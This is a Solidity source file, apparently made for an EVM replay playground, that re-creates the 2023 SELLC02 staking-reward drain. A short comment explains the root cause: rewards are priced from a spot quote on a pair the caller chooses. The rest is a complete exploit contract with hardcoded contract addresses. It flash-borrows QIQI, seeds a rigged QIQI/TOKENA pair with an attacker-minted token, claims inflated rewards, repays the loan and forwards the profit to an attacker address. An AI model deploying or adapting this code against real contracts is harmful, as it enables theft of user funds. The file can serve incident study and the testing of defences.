// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-SELLC02).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry ContractTest (the
// PancakeV3 flash callback `pancakeV3FlashCallback` lives on the test itself, and
// the test deploys 10 `Exploiter` sub-contracts to open independent staking
// positions). The playground records ONE contract at a single fixed block
// timestamp, so we faithfully reproduce the drain with a SINGLE staking position
// (the same vulnerability fires identically; one claim still drains QIQI from the
// reward reserve against the attacker-seeded price pair). Logic and constants are
// copied verbatim from test/SELLC02_exp.sol.
//
// Root cause: StakingRewards.claim(token, token1) values the reward via a raw spot
// getAmountsOut quote on a pair (token1/token) the CALLER chooses freely. The
// attacker flash-borrows QIQI, creates a QIQI/TOKENA pair seeded at 10_000e18 QIQI
// : 100 wei TOKENA, then claims — the saturated curve mints QIQI from the reserve.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IStakingRewards {
    function stake(address token, address token1, address token2, address up, uint256 amount) external;
    function claim(address token, address token1) external;
}

interface IRouter {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA, address tokenB,
        uint256 amountADesired, uint256 amountBDesired,
        uint256 amountAMin, uint256 amountBMin,
        address to, uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function removeLiquidity(
        address tokenA, address tokenB,
        uint256 liquidity,
        uint256 amountAMin, uint256 amountBMin,
        address to, uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

interface IUniswapV2Factory {
    function getPair(address, address) external view returns (address);
}

interface IUniswapV2Pair {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

// Minimal attacker-minted valuation token (verbatim from the PoC's TOKENA).
contract TOKENA {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "TokenA";
    string public symbol = "TokenA";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }
}

contract SellcDrain {
    address constant ATTACKER = 0xa3aa817587556C023e78B2285D381C68CEe17069; // tz-seeded; profit receiver
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant SELLC = 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4;
    address constant QIQI = 0x0B464d2C36d52bbbf3071B2b0FcA82032DCf656d;
    address constant PAIR_V3 = 0x4B1aC1E4B828EBC81FcaC587BEf64e4aDd1dBCEc; // PancakeV3 QIQI flash pool
    address constant ROUTER = 0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B;
    address constant STAKING = 0xeaF83465025b4Bf9020fdF9ea5fB6e71dC8a0779;

    uint256 constant STAKE_AMOUNT = 100 ether;     // 100 USDT per position (>= 100 ether gate)
    uint256 constant FLASH_AMOUNT = 10_000 ether;   // 10_000 QIQI flash-borrowed to seed the rigged pool
    uint256 constant FLASH_FEE_QIQI = 100 ether;    // PancakeV3 fee on the borrowed QIQI (1%)
    uint256 constant TOKENA_SEED = 100;             // 100 wei TOKENA — extreme ratio

    TOKENA public tokenA;
    IUniswapV2Pair public pair;

    // step 0 (run from setup, UNRECORDED): open one staking position so
    // users[QIQI][this].mnu == 1 and stakedOf[QIQI][this][1] > 0. ATTACKER is the
    // referral `up` (it carries users[QIQI][ATTACKER].tz > 0 from the constructor
    // seed, satisfying stake()'s gate). Staking is funded with USDT dealt to this
    // contract in setup.
    function stakeOnce() external {
        IERC20(USDT).approve(address(STAKING), STAKE_AMOUNT);
        IStakingRewards(STAKING).stake(QIQI, SELLC, USDT, ATTACKER, STAKE_AMOUNT);
    }

    // Recorded attack: mint the junk valuation token, flash-borrow QIQI, rig the
    // price pair inside the callback, claim the inflated reward, unwind, repay.
    function run() external {
        tokenA = new TOKENA();
        tokenA.mint(TOKENA_SEED);
        IPancakeV3Pool(PAIR_V3).flash(address(this), FLASH_AMOUNT, 0, new bytes(1));
        // forward any QIQI profit to the attacker EOA (the profit receiver)
        IERC20(QIQI).transfer(ATTACKER, IERC20(QIQI).balanceOf(address(this)));
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata) external {
        require(msg.sender == PAIR_V3, "only flash pool");
        // rig the QIQI/TOKENA spot price: 10_000e18 QIQI : 100 wei TOKENA
        IERC20(QIQI).approve(address(ROUTER), IERC20(QIQI).balanceOf(address(this)));
        tokenA.approve(address(ROUTER), tokenA.balanceOf(address(this)));
        IRouter(ROUTER).addLiquidity(
            address(QIQI),
            address(tokenA),
            IERC20(QIQI).balanceOf(address(this)),
            tokenA.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );
        // drain: claim values the staked principal at the saturated TOKENA->QIQI price
        IStakingRewards(STAKING).claim(QIQI, address(tokenA));
        // unwind the rigged LP, recovering the QIQI used to seed it
        pair = IUniswapV2Pair(IUniswapV2Factory(IRouter(ROUTER).factory()).getPair(address(QIQI), address(tokenA)));
        pair.approve(address(ROUTER), pair.balanceOf(address(this)));
        IRouter(ROUTER).removeLiquidity(
            address(QIQI),
            address(tokenA),
            pair.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );
        // repay the flash loan: principal + fee (fee0 == 1% of FLASH_AMOUNT)
        IERC20(QIQI).transfer(PAIR_V3, FLASH_AMOUNT + fee0);
    }
}
